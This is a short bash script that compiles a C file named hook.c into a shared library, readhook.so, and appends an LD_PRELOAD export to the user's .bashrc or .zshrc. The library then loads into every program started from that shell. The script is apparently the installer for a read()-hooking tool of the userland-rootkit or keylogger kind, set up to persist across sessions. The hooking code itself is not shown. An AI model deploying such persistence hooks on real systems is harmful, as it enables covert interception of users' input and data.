#!/bin/bash

C_SOURCE="hook.c"
SO="readhook.so"

echo "[+] Compiling ${C_SOURCE} To ${SO} [+]"
gcc -shared -fPIC -o "${SO}" "${C_SOURCE}" -ldl
if [ $? -ne 0 ]; then
    echo "[!] Failed Compiling The Source Code! [!]"
    exit 1
fi

SO_PATH="$(pwd)/${SO}"

SHELL_NAME=$(basename "$SHELL")
if [ "$SHELL_NAME" = "zsh" ]; then
    echo "[+] Found ZSH [+]"
    RC_FILE="$HOME/.zshrc"
else
    echo "[+] Assuming Bash is Running [+]"
    RC_FILE="$HOME/.bashrc"
fi

EXPORT_LINE="export LD_PRELOAD=${SO_PATH}"

if grep -Fxq "${EXPORT_LINE}" "${RC_FILE}"; then
    echo "[!] ${SO} Was Already Preloaded In ${RC_FILE} [!]"
else
    echo "${EXPORT_LINE}" >> "${RC_FILE}"
    echo "[+] ${SO} Preloaded to ${RC_FILE} [+]"
fi

echo "[*] Restart Your Terminal To Do Magic [*]"
